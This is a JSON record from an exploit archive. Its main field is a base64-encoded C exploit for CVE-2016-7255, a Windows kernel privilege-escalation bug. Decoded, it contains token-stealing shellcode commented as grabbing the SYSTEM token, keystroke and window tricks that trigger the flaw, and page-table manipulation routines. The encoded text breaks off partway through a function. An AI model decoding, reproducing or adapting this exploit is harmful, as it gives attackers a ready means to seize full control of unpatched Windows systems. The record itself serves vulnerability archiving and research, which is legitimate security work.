{
    "source": "exploit-database", 
    "exploit": "LyoNClNvdXJjZTogaHR0cHM6Ly9yaWNrbGFyYWJlZS5ibG9nc3BvdC5jb20vMjAxNy8wMS92aXJ0dWFsLW1lbW9yeS1wYWdlLXRhYmxlcy1hbmQtb25lLWJpdC5odG1sDQoNCkJpbmFyeTogaHR0cHM6Ly9naXRodWIuY29tL3JsYXJhYmVlL2V4cGxvaXRzL3Jhdy84YjllYjY0NjUxNmQ3ZjAyMmEwMTBmMjgwMTgyMDlmMzMxYzI4OTc1L2N2ZS0yMDE2LTcyNTUvY29tcGlsZWQvY3ZlLTIwMTYtNzI1NS5leGUNCk1pcnJvcjogaHR0cHM6Ly9naXRodWIuY29tL29mZmVuc2l2ZS1zZWN1cml0eS9leHBsb2l0LWRhdGFiYXNlLWJpbi1zcGxvaXRzL3Jhdy9tYXN0ZXIvc3Bsb2l0cy80MTAxNS5leGUNCiovDQoNCi8vIHJpY2tsYXJhYmVlLmJsb2dzcG90LmNvbQ0KDQovL1RoaXMgcHJvZ3JhbSBpcyBmcmVlIHNvZnR3YXJlOyB5b3UgY2FuIHJlZGlzdHJpYnV0ZSBpdCBhbmQvb3INCi8vbW9kaWZ5IGl0IHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2UNCi8vYXMgcHVibGlzaGVkIGJ5IHRoZSBGcmVlIFNvZnR3YXJlIEZvdW5kYXRpb24uDQoNCi8vVGhpcyBwcm9ncmFtIGlzIGRpc3RyaWJ1dGVkIGluIHRoZSBob3BlIHRoYXQgaXQgd2lsbCBiZSB1c2VmdWwsDQovL2J1dCBXSVRIT1VUIEFOWSBXQVJSQU5UWTsgd2l0aG91dCBldmVuIHRoZSBpbXBsaWVkIHdhcnJhbnR5IG9mDQovL01FUkNIQU5UQUJJTElUWSBvciBGSVRORVNTIEZPUiBBIFBBUlRJQ1VMQVIgUFVSUE9TRS5TZWUgdGhlDQovL0dOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlIGZvciBtb3JlIGRldGFpbHMuDQoNCi8vWW91IHNob3VsZCBoYXZlIHJlY2VpdmVkIGEgY29weSBvZiB0aGUgR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2UNCi8vYWxvbmcgd2l0aCB0aGlzIHByb2dyYW07IGlmIG5vdCwgd3JpdGUgdG8gdGhlIEZyZWUgU29mdHdhcmUNCi8vRm91bmRhdGlvbiwgSW5jLiwgNTEgRnJhbmtsaW4gU3RyZWV0LCBGaWZ0aCBGbG9vciwgQm9zdG9uLCBNQSAgMDIxMTAtMTMwMSwgVVNBLg0KDQovLyBDcmVkaXRzOiBlbnJpcXVlLm5pc3NpbUBJT0FjdGl2ZS5jb206IGh0dHBzOi8vZ2l0aHViLmNvbS9JT0FjdGl2ZS9JLWtub3ctd2hlcmUteW91ci1wYWdlLWxpdmVzL3RyZWUvbWFzdGVyL2NvZGUvQ1ZFLTIwMTYtNzI1NQ0KLy8gUG9DIGZyb20gaHR0cHM6Ly9naXRodWIuY29tL3RpbnlzZWMvcHVibGljL3RyZWUvbWFzdGVyL0NWRS0yMDE2LTcyNTUNCg0KI2luY2x1ZGUgPHdpbmRvd3MuaD4NCiNpbmNsdWRlIDx3Y2hhci5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHN0ZGlvLmg+DQoNCiNwcmFnbWEgY29tbWVudChsaWIsIm50ZGxsLmxpYiIpDQojcHJhZ21hIGNvbW1lbnQobGliLCJ1c2VyMzIubGliIikNCiNwcmFnbWEgY29tbWVudChsaWIsICJhZHZhcGkzMiIpDQoNClVJTlQ2NCBQTUw0X0JBU0U7DQpVSU5UIFBNTDRfU0VMRl9SRUZfSU5ERVg7DQpVSU5UNjQgUE1MNF9TRUxGX1JFRiA9IDB4RkZGRkY2RkI3REJFREY2ODsNCg0KI2RlZmluZSBTVEFUVVNfU1VDQ0VTUyAoKE5UU1RBVFVTKTB4MDAwMDAwMDBMKQ0KI2RlZmluZSBTVEFUVVNfVU5TVUNDRVNTRlVMICgoTlRTVEFUVVMpMHhDMDAwMDAwMUwpDQojZGVmaW5lIEdFVF9JTkRFWCh2YSkgICggKCh2YSA+PiAzOSkgJiAweDFmZiApKSANCg0KLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCi8vIERlZmluZSBEYXRhIFR5cGVzDQovLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KdHlwZWRlZiBzdHJ1Y3QgX1NZU1RFTV9NT0RVTEVfSU5GT1JNQVRJT05fRU5UUlkgew0KICAgIFBWT0lEICBVbmtub3duMTsNCiAgICBQVk9JRCAgVW5rbm93bjI7DQogICAgUFZPSUQgIEJhc2U7DQogICAgVUxPTkcgIFNpemU7DQogICAgVUxPTkcgIEZsYWdzOw0KICAgIFVTSE9SVCBJbmRleDsNCiAgICBVU0hPUlQgTmFtZUxlbmd0aDsNCiAgICBVU0hPUlQgTG9hZENvdW50Ow0KICAgIFVTSE9SVCBQYXRoTGVuZ3RoOw0KICAgIENIQVIgICBJbWFnZU5hbWVbMjU2XTsNCn0gU1lTVEVNX01PRFVMRV9JTkZPUk1BVElPTl9FTlRSWSwgKlBTWVNURU1fTU9EVUxFX0lORk9STUFUSU9OX0VOVFJZOw0KDQp0eXBlZGVmIHN0cnVjdCBfU1lTVEVNX01PRFVMRV9JTkZPUk1BVElPTiB7DQogICAgVUxPTkcgICBDb3VudDsNCiAgICBTWVNURU1fTU9EVUxFX0lORk9STUFUSU9OX0VOVFJZIE1vZHVsZVsxXTsNCn0gU1lTVEVNX01PRFVMRV9JTkZPUk1BVElPTiwgKlBTWVNURU1fTU9EVUxFX0lORk9STUFUSU9OOw0KDQp0eXBlZGVmIGVudW0gX1NZU1RFTV9JTkZPUk1BVElPTl9DTEFTUyB7IA0KICAgIFN5c3RlbU1vZHVsZUluZm9ybWF0aW9uID0gMTEsDQogICAgU3lzdGVtSGFuZGxlSW5mb3JtYXRpb24gPSAxNg0KfSBTWVNURU1fSU5GT1JNQVRJT05fQ0xBU1M7DQoNCnR5cGVkZWYgTlRTVEFUVVMgKFdJTkFQSSAqTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uX3QpKElOIFNZU1RFTV9JTkZPUk1BVElPTl9DTEFTUyBTeXN0ZW1JbmZvcm1hdGlvbkNsYXNzLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBPVVQgUFZPSUQgICAgICAgICAgICAgICAgICAgU3lzdGVtSW5mb3JtYXRpb24sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIElOIFVMT05HICAgICAgICAgICAgICAgICAgICBTeXN0ZW1JbmZvcm1hdGlvbkxlbmd0aCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgT1VUIFBVTE9ORyBSZXR1cm5MZW5ndGgpOw0KDQp0eXBlZGVmIE5UU1RBVFVTIChXSU5BUEkgKk50UXVlcnlJbnRlcnZhbFByb2ZpbGVfdCkoSU4gVUxPTkcgICBQcm9maWxlU291cmNlLA0KCQkJCQkJCQkJCQkJCU9VVCBQVUxPTkcgSW50ZXJ2YWwpOw0KDQpOdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb25fdCBOdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb247DQpOdFF1ZXJ5SW50ZXJ2YWxQcm9maWxlX3QgTnRRdWVyeUludGVydmFsUHJvZmlsZTsNCiAgICAgICAgICAgICAgICAgIA0KY2hhciBzaGVsbGNvZGVbXSA9IHsNCgkvLzB4Y2MsDQoJMHhmYSwgCQkJCQkJCQkJCQkJCQkJLy8gQ0xJDQoJMHg5YywgCQkJCQkJCQkJCQkJCQkJLy8gUFVTSEZRDQoJMHg0OCwgMHhiOCwgMHg5MCwgMHg5MCwgMHg5MCAsMHg5MCAsMHg5MCwgMHg5MCwgMHg5MCwgMHg5MCwgIAkvLyBNT1YgUkFYLCBPcmlnaW5hbCBQb2ludGVyDQoJMHg1MCwgCQkJCQkJCQkJCQkJCQkJLy8gUFVTSCBSQVgNCgkweDUxLCAJCQkJCQkJCQkJCQkJCQkvLyBQVVNIIFJDWA0KCTB4NDgsIDB4YjksIDB4OTAsIDB4OTAsIDB4OTAgLDB4OTAgLDB4OTAsIDB4OTAsIDB4OTAsIDB4OTAsICAJLy8gTU9WIFJDWCwgW092ZXJ3cml0ZUFkZHIrT3ZlcndyaXRlT2Zmc2V0XQ0KCTB4NDgsIDB4ODksIDB4MDEsICAJCQkJCQkJCQkJCQkvLyBNT1YgICAgUVdPUkQgUFRSIFtSQ1hdLCBSQVgNCgkweGI5LCAweDkwLCAweDkwLCAweDkwLCAweDkwLCAgCQkJCQkJCQkJLy8gTU9WIEVDWCwgUElEDQoJMHg1MywgCQkJCQkJCQkJCQkJCQkJLy8gUFVTSCBSQlgNCg0KCTB4NjUsIDB4NDgsIDB4OEIsIDB4MDQsIDB4MjUsIDB4ODgsIDB4MDEsIDB4MDAsIDB4MDAsICAJCQkvLyBNT1YgICAgUkFYLFFXT1JEIFBUUiBnczoweDE4OA0KCTB4NDgsIDB4OEIsIDB4ODAsIDB4QjgsIDB4MDAsIDB4MDAsIDB4MDAsCQkJCQkJLy8gTU9WICAgIFJBWCxRV09SRCBQVFIgW1JBWCsweGI4XSBFUFJPQ0VTUw0KCTB4NDgsIDB4OGQsIDB4ODAsIDB4OTAsIDB4OTAsIDB4MDAsIDB4MDAsCQkJCQkJLy8gTEVBICAgIFJBWCxbUkFYKzB4QWN0aXZlUHJvY2Vzc0xpbmtPZmZzZXRdIA0KCS8vPHRhZz4NCgkweDQ4LCAweDhiLCAweDAwLAkJCQkJCQkJCQkJCS8vIE1PViAgICBSQVgsUVdPUkQgUFRSIFtSQVhdDQoJMHg0OCwgMHg4YiwgMHg1OCwgMHhmOCwJCQkJCQkJCQkJCS8vIE1PViAgICBSQlgsUVdPUkQgUFRSIFtSQVgtMHg4XSAvLyBVbmlxdWVQcm9jZXNzSUQNCgkweDQ4LCAweDgzLCAweGZiLCAweDA0LAkJCQkJCQkJCQkJLy8gQ01QICAgIFJCWCwweDQNCgkweDc1LCAweGYzLAkJCQkJCQkJCQkJCQkJLy8gSk5FICAgIDx0YWc+DQoJMHg0OCwgMHg4YiwgMHg5OCwgMHg5MCwgMHg5MCwgMHg5MCwgMHg5MCwJCQkJCQkvLyBNT1YgICAgUkJYLCBRV09SRCBQVFIgW1JBWCsweDYwXSAvLyBHRVQgVE9LRU4gb2YgU1lTVEVNDQoNCgkweDUzLCAJCQkJCQkJCQkJCQkJCQkvLyBQVVNIIFJCWA0KCS8vPHRhZzI+DQoJMHg0OCwgMHg4YiwgMHgwMCwJCQkJCQkJCQkJCQkvLyBNT1YgICAgUkFYLFFXT1JEIFBUUiBbUkFYXQ0KCTB4NDgsIDB4OGIsIDB4NTgsIDB4ZjgsCQkJCQkJCQkJCQkvLyBNT1YgICAgUkJYLFFXT1JEIFBUUiBbUkFYLTB4OF0gLy8gVW5pcXVlUHJvY2Vzc0lEDQoJMHgzOSwgMHhjYiwJCQkJCQkJCQkJCQkJCS8vIENNUCAgICBFQlgsIEVDWCAvLyBvdXIgUElEDQoJMHg3NSwgMHhmNSwJCQkJCQkJCQkJCQkJCS8vIEpORSAgICA8dGFnMj4NCgkweDViLCAJCQkJCQkJCQkJCQkJCQkvLyBQT1AgUkJYDQoJMHg0OCwgMHg4OSwgMHg5OCwgMHg5MCwgMHg5MCwgMHg5MCwgMHg5MCwJCQkJCQkvLyBNT1YgICAgUVdPUkQgUFRSW1JBWCArIDB4NjBdLCBSQlgNCg0KCTB4NWIsIC8vIFBPUCBSQlgNCgkweDU5LCAvLyBQT1AgUkNYDQoJMHg1OCwgLy8gUE9QIFJBWA0KCTB4OWQsIC8vIFBPUEZRDQoNCgkweGZiLCAvLyBTVEkNCgkweGZmLCAweGUwIC8vIEpNUCBSQVgNCn07DQoNClVMT05HIF9fY2RlY2wgRGJnUHJpbnQoX19pbiBjaGFyKiBGb3JtYXQsIC4uLikNCnsNCglDSEFSKiBwc3pEYmdCdWZmID0gTlVMTDsNCgl2YV9saXN0IFZhTGlzdCA9IE5VTEw7DQoJVUxPTkcgdWxSZXQgPSAwOw0KDQoJZG8NCgl7DQoJCXBzekRiZ0J1ZmYgPSAoQ0hBUiopSGVhcEFsbG9jKEdldFByb2Nlc3NIZWFwKCksIDAsIDEwMjQgKiBzaXplb2YoQ0hBUikpOw0KCQlpZiAoTlVMTCA9PSBwc3pEYmdCdWZmKQ0KCQl7DQoJCQlicmVhazsNCgkJfQ0KCQlSdGxaZXJvTWVtb3J5KHBzekRiZ0J1ZmYsIDEwMjQgKiBzaXplb2YoQ0hBUikpOw0KDQoJCXZhX3N0YXJ0KFZhTGlzdCwgRm9ybWF0KTsNCg0KCQlfdnNucHJpbnRmKChDSEFSKilwc3pEYmdCdWZmLCAxMDI0IC0gMSwgRm9ybWF0LCBWYUxpc3QpOw0KDQoNCgkJT3V0cHV0RGVidWdTdHJpbmdBKHBzekRiZ0J1ZmYpOw0KDQoJCXZhX2VuZChWYUxpc3QpOw0KDQoJfSB3aGlsZSAoRkFMU0UpOw0KDQoJaWYgKE5VTEwgIT0gcHN6RGJnQnVmZikNCgl7DQoJCUhlYXBGcmVlKEdldFByb2Nlc3NIZWFwKCksIDAsIHBzekRiZ0J1ZmYpOw0KCQlwc3pEYmdCdWZmID0gTlVMTDsNCgl9DQoNCglyZXR1cm4gdWxSZXQ7DQp9DQoNCg0KaW50IF9zaW1fa2V5X2Rvd24oV09SRCB3S2V5KQ0Kew0KCUlOUFVUIHN0SW5wdXQgPSB7IDAgfTsNCg0KCWRvDQoJew0KCQlzdElucHV0LnR5cGUgPSBJTlBVVF9LRVlCT0FSRDsNCgkJc3RJbnB1dC5raS53VmsgPSB3S2V5Ow0KCQlzdElucHV0LmtpLmR3RmxhZ3MgPSAwOw0KDQoJCVNlbmRJbnB1dCgxLCAmc3RJbnB1dCwgc2l6ZW9mKHN0SW5wdXQpKTsNCg0KCX0gd2hpbGUgKEZBTFNFKTsNCg0KCXJldHVybiAwOw0KfQ0KDQppbnQgX3NpbV9rZXlfdXAoV09SRCB3S2V5KQ0Kew0KCUlOUFVUIHN0SW5wdXQgPSB7IDAgfTsNCg0KCWRvDQoJew0KCQlzdElucHV0LnR5cGUgPSBJTlBVVF9LRVlCT0FSRDsNCgkJc3RJbnB1dC5raS53VmsgPSB3S2V5Ow0KCQlzdElucHV0LmtpLmR3RmxhZ3MgPSBLRVlFVkVOVEZfS0VZVVA7DQoNCgkJU2VuZElucHV0KDEsICZzdElucHV0LCBzaXplb2Yoc3RJbnB1dCkpOw0KDQoJfSB3aGlsZSAoRkFMU0UpOw0KDQoJcmV0dXJuIDA7DQp9DQoNCmludCBfc2ltX2FsdF9zaGlmdF9lc2MoKQ0Kew0KCWludCBpID0gMDsNCg0KCWRvDQoJew0KCQlfc2ltX2tleV9kb3duKFZLX01FTlUpOw0KCQlfc2ltX2tleV9kb3duKFZLX1NISUZUKTsNCg0KDQoJCV9zaW1fa2V5X2Rvd24oVktfRVNDQVBFKTsNCgkJX3NpbV9rZXlfdXAoVktfRVNDQVBFKTsNCg0KCQlfc2ltX2tleV9kb3duKFZLX0VTQ0FQRSk7DQoJCV9zaW1fa2V5X3VwKFZLX0VTQ0FQRSk7DQoNCgkJX3NpbV9rZXlfdXAoVktfTUVOVSk7DQoJCV9zaW1fa2V5X3VwKFZLX1NISUZUKTsNCg0KDQoJfSB3aGlsZSAoRkFMU0UpOw0KDQoJcmV0dXJuIDA7DQp9DQoNCg0KDQppbnQgX3NpbV9hbHRfc2hpZnRfdGFiKGludCBuQ291bnQpDQp7DQoJaW50IGkgPSAwOw0KCUhXTkQgaFduZCA9IE5VTEw7DQoNCg0KCWludCBuRmluYWxSZXQgPSAtMTsNCg0KCWRvDQoJew0KCQlfc2ltX2tleV9kb3duKFZLX01FTlUpOw0KCQlfc2ltX2tleV9kb3duKFZLX1NISUZUKTsNCg0KDQoJCWZvciAoaSA9IDA7IGkgPCBuQ291bnQ7IGkrKykNCgkJew0KCQkJX3NpbV9rZXlfZG93bihWS19UQUIpOw0KCQkJX3NpbV9rZXlfdXAoVktfVEFCKTsNCg0KCQkJU2xlZXAoMTAwMCk7DQoNCgkJfQ0KDQoNCgkJX3NpbV9rZXlfdXAoVktfTUVOVSk7DQoJCV9zaW1fa2V5X3VwKFZLX1NISUZUKTsNCgl9IHdoaWxlIChGQUxTRSk7DQoNCglyZXR1cm4gbkZpbmFsUmV0Ow0KfQ0KDQppbnQgX3NpbV9hbHRfZXNjKGludCBjb3VudCkNCnsNCglpbnQgaSA9IDA7DQoNCglmb3IgKGkgPSAwOyBpPGNvdW50OyBpKyspDQoJew0KCQlfc2ltX2tleV9kb3duKFZLX01FTlUpOw0KCQkvL19zaW1fa2V5X2Rvd24oVktfU0hJRlQpOw0KDQoNCgkJX3NpbV9rZXlfZG93bihWS19FU0NBUEUpOw0KCQlfc2ltX2tleV91cChWS19FU0NBUEUpOw0KDQoJCV9zaW1fa2V5X2Rvd24oVktfRVNDQVBFKTsNCgkJX3NpbV9rZXlfdXAoVktfRVNDQVBFKTsNCg0KCQlfc2ltX2tleV91cChWS19NRU5VKTsNCgkJLy9fc2ltX2tleV91cChWS19TSElGVCk7DQoNCgl9DQoNCglyZXR1cm4gMDsNCn0NCg0KDQppbnQgb3JfYWRkcmVzc192YWx1ZV80KF9faW4gdm9pZCogcEFkZHJlc3MpDQp7DQoJV05EQ0xBU1NFWFcgc3RXQyA9IHsgMCB9Ow0KDQoJSFdORCAgICBoV25kUGFyZW50ID0gTlVMTDsNCglIV05EICAgIGhXbmRDaGlsZCA9IE5VTEw7DQoNCglXQ0hBUiogIHBzekNsYXNzTmFtZSA9IEwiY3ZlLTIwMTYtNzI1NSI7DQoJV0NIQVIqICBwc3pUaXRsZU5hbWUgPSBMImN2ZS0yMDE2LTcyNTUiOw0KDQoJdm9pZCogICBwSWQgPSBOVUxMOw0KCU1TRyAgICAgc3RNc2cgPSB7IDAgfTsNCg0KCVVJTlQ2NCB2YWx1ZSA9IDA7DQoNCglkbw0KCXsNCg0KCQlzdFdDLmNiU2l6ZSA9IHNpemVvZihzdFdDKTsNCgkJc3RXQy5scGZuV25kUHJvYyA9IERlZldpbmRvd1Byb2NXOw0KCQlzdFdDLmxwc3pDbGFzc05hbWUgPSBwc3pDbGFzc05hbWU7DQoNCgkJaWYgKDAgPT0gUmVnaXN0ZXJDbGFzc0V4Vygmc3RXQykpDQoJCXsNCgkJCWJyZWFrOw0KCQl9DQoNCgkJaFduZFBhcmVudCA9IENyZWF0ZVdpbmRvd0V4VygNCgkJCTAsDQoJCQlwc3pDbGFzc05hbWUsDQoJCQlOVUxMLA0KCQkJV1NfT1ZFUkxBUFBFRFdJTkRPVyB8IFdTX1ZJU0lCTEUsDQoJCQkwLA0KCQkJMCwNCgkJCTM2MCwNCgkJCTM2MCwNCgkJCU5VTEwsDQoJCQlOVUxMLA0KCQkJR2V0TW9kdWxlSGFuZGxlVyhOVUxMKSwNCgkJCU5VTEwNCgkJKTsNCg0KCQlpZiAoTlVMTCA9PSBoV25kUGFyZW50KQ0KCQl7DQoJCQlicmVhazsNCgkJfQ0KDQoJCWhXbmRDaGlsZCA9IENyZWF0ZVdpbmRvd0V4VygNCgkJCTAsDQoJCQlwc3pDbGFzc05hbWUsDQoJCQlwc3pUaXRsZU5hbWUsDQoJCQlXU19PVkVSTEFQUEVEV0lORE9XIHwgV1NfVklTSUJMRSB8IFdTX0NISUxELA0KCQkJMCwNCgkJCTAsDQoJCQkxNjAsDQoJCQkxNjAsDQoJCQloV25kUGFyZW50LA0KCQkJTlVMTCwNCgkJCUdldE1vZHVsZUhhbmRsZVcoTlVMTCksDQoJCQlOVUxMDQoJCSk7DQoNCgkJaWYgKE5VTEwgPT0gaFduZENoaWxkKQ0KCQl7DQoJCQlicmVhazsNCgkJfQ0KDQojaWZkZWYgX1dJTjY0DQoJCXBJZCA9ICgoVUNIQVIqKXBBZGRyZXNzIC0gMHgyOCk7DQojZWxzZQ0KCQlwSWQgPSAoKFVDSEFSKilwQWRkcmVzcyAtIDB4MTQpOw0KI2VuZGlmIC8vICNpZmRlZiBfV0lONjQNCg0KCQlTZXRXaW5kb3dMb25nUHRyKGhXbmRDaGlsZCwgR1dMUF9JRCwgKExPTkdfUFRSKXBJZCk7DQoNCgkJRGJnUHJpbnQoImhXbmRDaGlsZCA9IDB4JXBcbiIsIGhXbmRDaGlsZCk7DQoNCgkJU2hvd1dpbmRvdyhoV25kUGFyZW50LCBTV19TSE9XTk9STUFMKTsNCg0KCQlTZXRQYXJlbnQoaFduZENoaWxkLCBHZXREZXNrdG9wV2luZG93KCkpOw0KDQoJCVNldEZvcmVncm91bmRXaW5kb3coaFduZENoaWxkKTsNCg0KCQlfc2ltX2FsdF9zaGlmdF90YWIoNCk7DQoNCgkJU3dpdGNoVG9UaGlzV2luZG93KGhXbmRDaGlsZCwgVFJVRSk7DQoNCgkJX3NpbV9hbHRfc2hpZnRfZXNjKCk7DQoNCgkJd2hpbGUgKEdldE1lc3NhZ2UoJnN0TXNnLCBOVUxMLCAwLCAwKSkgew0KCQkJDQoJCQlTZXRGb2N1cyhoV25kUGFyZW50KTsNCgkJCV9zaW1fYWx0X2VzYygyMCk7DQoJCQlTZXRGb2N1cyhoV25kQ2hpbGQpOw0KCQkJX3NpbV9hbHRfZXNjKDIwKTsNCg0KCQkJVHJhbnNsYXRlTWVzc2FnZSgmc3RNc2cpOw0KCQkJRGlzcGF0Y2hNZXNzYWdlKCZzdE1zZyk7DQoJCQkNCgkJCWlmICh2YWx1ZSAhPSAwKSB7DQoJCQkJYnJlYWs7DQoJCQl9DQoJCQkNCg0KCQkJX190cnkgew0KCQkJCXZhbHVlID0gKihVSU5UNjQgKilQTUw0X1NFTEZfUkVGOw0KCQkJCWlmICgodmFsdWUgJiAweDY3KSA9PSAweDY3KSB7DQoJCQkJCXByaW50ZigiVmFsdWUgU2VsZiBSZWYgPSAlbGx4XG4iLCB2YWx1ZSk7DQoJCQkJCWJyZWFrOw0KCQkJCX0NCgkJCX0NCgkJCV9fZXhjZXB0IChFWENFUFRJT05fRVhFQ1VURV9IQU5ETEVSKSB7DQoJCQkJY29udGludWU7DQoJCQl9DQoNCgkJfQ0KDQoNCgl9IHdoaWxlIChGQUxTRSk7DQoNCglpZiAoTlVMTCAhPSBoV25kUGFyZW50KQ0KCXsNCgkJRGVzdHJveVdpbmRvdyhoV25kUGFyZW50KTsNCgkJaFduZFBhcmVudCA9IE5VTEw7DQoJfQ0KDQoJaWYgKE5VTEwgIT0gaFduZENoaWxkKQ0KCXsNCgkJRGVzdHJveVdpbmRvdyhoV25kQ2hpbGQpOw0KCQloV25kQ2hpbGQgPSBOVUxMOw0KCX0NCg0KCVVucmVnaXN0ZXJDbGFzc1cocHN6Q2xhc3NOYW1lLCBHZXRNb2R1bGVIYW5kbGVXKE5VTEwpKTsNCg0KCXJldHVybiAwOw0KfQ0KDQpVSU5UNjQgZ2V0X3B4ZV9hZGRyZXNzKFVJTlQ2NCBhZGRyZXNzKSB7DQoJVUlOVCBlbnRyeSA9IFBNTDRfU0VMRl9SRUZfSU5ERVg7DQoJVUlOVDY0IHJlc3VsdCA9IGFkZHJlc3MgPj4gOTsNCglVSU5UNjQgbG93ZXJfYm91bmRhcnkgPSAoKFVJTlQ2NCkweEZGRkYgPDwgNDgpIHwgKChVSU5UNjQpZW50cnkgPDwgMzkpOw0KCVVJTlQ2NCB1cHBlcl9ib3VuZGFyeSA9ICgoKFVJTlQ2NCkweEZGRkYgPDwgNDgpIHwgKChVSU5UNjQpZW50cnkgPDwgMzkpICsgMHg4MDAwMDAwMDAwIC0gMSkgJiAweEZGRkZGRkZGRkZGRkZGRjg7DQoJcmVzdWx0ID0gcmVzdWx0IHwgbG93ZXJfYm91bmRhcnk7DQoJcmVzdWx0ID0gcmVzdWx0ICYgdXBwZXJfYm91bmRhcnk7DQoJcmV0dXJuIHJlc3VsdDsNCn0NCg0KVUlOVDY0IGxvb2tfZnJlZV9lbnRyeV9wbWw0KHZvaWQpIHsNCgkvLyBMb29rcyBmb3IgYSBmcmVlIHBtbDRlIGluIHRoZSBsYXN0IDB4MTAwIGJ5dGVzIG9mIHRoZSBQTUw0DQoJaW50IG9mZnNldCA9IDB4RjAwOw0KCVVJTlQ2NCBwbWw0X3NlYXJjaCA9IFBNTDRfQkFTRSArIG9mZnNldDsNCgl3aGlsZSAob2Zmc2V0IDwgMHhGRjgpDQoJew0KCQlpZiAoKCooUFZPSUQgKilwbWw0X3NlYXJjaCkgPT0gMHgwKQ0KCQl7DQoJCQkvLyBUaGlzIGlzIGEgTlVMTCAoZnJlZSkgZW50cnkNCgkJCWJyZWFrOw0KCQl9DQoJCW9mZnNldCArPSA4Ow0KCQlwbWw0X3NlYXJjaCA9IFBNTDRfQkFTRSArIG9mZnNldDsNCgl9DQoJcmV0dXJuIHBtbDRfc2VhcmNoOw0KfQ0KDQpVSU5UNjQgY2FsY3VsYXRlX3NwdXJpb3VzX3B0X2FkZHJlc3MoVUlOVDY0IHNwdXJpb3VzX29mZnNldCkgew0KCVVJTlQ2NCBpbmRleCA9IChzcHVyaW91c19vZmZzZXQgJiAweEZGRikgLyA4Ow0KCVVJTlQ2NCByZXN1bHQgPSAoDQoJCSgoVUlOVDY0KTB4RkZGRiA8PCA0OCkgfA0KCQkoKFVJTlQ2NClQTUw0X1NFTEZfUkVGX0lOREVYIDw8IDM5KSB8DQoJCSgoVUlOVDY0KVBNTDRfU0VMRl9SRUZfSU5ERVggPDwgMzApIHwNCgkJKChVSU5UNjQpUE1MNF9TRUxGX1JFRl9JTkRFWCA8PCAyMSkgfA0KCQkoaW5kZXggPDwgMTIpDQoJCSk7DQoJcmV0dXJuIHJlc3VsdDsNCn0NCg0KDQoNClVJTlQ2NCBjcmVhdGVfc3B1cmlvdXNfcHRlX3RvX3ZpcnR1YWxfYWRkcmVzcyhVSU5UNjQgdmlydHVhbF9hZGRyZXNzLCBCT09MIHBhdGNoX29yaWdpbmFsKSB7DQoNCgkvKg0KCTE6IGtkPiAhcHRlIGZmZmZmZmZmYGZmZDAwMDAwDQoJVkEgZmZmZmZmZmZmZmQwMDAwMA0KCVBYRSBhdCBGRkZGRjZGQjdEQkVERkY4ICAgIFBQRSBhdCBGRkZGRjZGQjdEQkZGRkY4ICAgIFBERSBhdCBGRkZGRjZGQjdGRkZGRkYwICAgIFBURSBhdCBGRkZGRjZGRkZGRkZFODAwDQoJY29udGFpbnMgMDAwMDAwMDAwMEExRjA2MyAgY29udGFpbnMgMDAwMDAwMDAwMEEyMDA2MyAgY29udGFpbnMgMDAwMDAwMDAwMEEyNTA2MyAgY29udGFpbnMgODAwMDAwMDAwMDEwMzk2Mw0KCXBmbiBhMWYtLSAtIERBLS1LV0VWICBwZm4gYTIwLS0gLSBEQS0tS1dFViAgcGZuIGEyNS0tIC0gREEtLUtXRVYgIHBmbiAxMDMgLSBHIC0gREEtLUtXIC0gVg0KCSovCQ0KDQoJVUlOVDY0IHB0ZSA9IGdldF9weGVfYWRkcmVzcyh2aXJ0dWFsX2FkZHJlc3MpOw0KCWludCBwdGVfb2Zmc2V0ID0gcHRlICYgMHhGRkY7DQoJLy9wcmludGYoIlBURTogJWxseCwgJXhcbiIsIHB0ZSwgcHRlX29mZnNldCk7DQoJDQoJVUlOVDY0IHBkZSA9IGdldF9weGVfYWRkcmVzcyhwdGUpOw0KCWludCBwZGVfb2Zmc2V0ID0gcGRlICYgMHhGRkY7DQoJLy9wcmludGYoIlBERTogJWxseCwgJXhcbiIsIHBkZSwgcGRlX29mZnNldCk7DQoJCQ0KCVVJTlQ2NCBwZHB0ZSA9IGdldF9weGVfYWRkcmVzcyhwZGUpOw0KCWludCBwZHB0ZV9vZmZzZXQgPSBwZHB0ZSAmIDB4RkZGOw0KCS8vcHJpbnRmKCJQRFBURTogJWxseCwleFxuIiwgcGRwdGUsIHBkcHRlX29mZnNldCk7DQoJCQ0KCVVJTlQ2NCBwbWw0ZSA9IGdldF9weGVfYWRkcmVzcyhwZHB0ZSk7DQoJaW50IHBtbDRlX29mZnNldCA9IHBtbDRlICYgMHhGRkY7DQoJLy9wcmludGYoIlBNTDRFOiAlbGx4XG4iLCBwbWw0ZSwgcG1sNGVfb2Zmc2V0KTsNCgkNCglVSU5UNjQgc3B1cmlvdXNfb2Zmc2V0ID0gbG9va19mcmVlX2VudHJ5X3BtbDQoKTsNCglwcmludGYoIlsrXSBTZWxlY3RlZCBzcHVyaW91cyBQTUw0RTogJWxseFxuIiwgc3B1cmlvdXNfb2Zmc2V0KTsNCglVSU5UNjQgZl9lX3BtbDQgPSBzcHVyaW91c19vZmZzZXQ7DQoJVUlOVDY0IHNwdXJpb3VzX3B0ID0gY2FsY3VsYXRlX3NwdXJpb3VzX3B0X2FkZHJlc3Moc3B1cmlvdXNfb2Zmc2V0KTsNCglwcmludGYoIlsrXSBTcHVyaW91cyBQVDogJWxseFxuIiwgc3B1cmlvdXNfcHQpOw0KCXByaW50ZigiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cblxuIik7DQoJDQoJDQoJLy9SZWFkIHRoZSBwaH